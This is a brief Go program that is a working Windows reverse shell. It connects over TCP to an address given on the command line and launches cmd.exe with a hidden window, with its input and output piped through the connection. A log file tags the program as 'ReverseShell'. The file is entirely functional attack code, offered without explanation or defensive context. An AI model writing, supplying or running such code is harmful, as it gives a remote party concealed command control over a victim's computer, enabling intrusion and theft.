package main

import (
	"helpers"
	"net"
	"os"
	"os/exec"
	"syscall"
)

func main() {
	nameOfLogFIle := helpers.CreateLogFileIfItDoesNotExist("./", "ReverseShell")
	connectString := os.Args[1]
	conn, err := net.Dial("tcp", connectString)
	if err != nil {
		helpers.WriteLog(nameOfLogFIle, err.Error(), 1)
		os.Exit(2)
	}
	cmd := exec.Command("cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	if err = cmd.Run(); err != nil {
		os.Exit(1)
	}
	os.Exit(0)
}
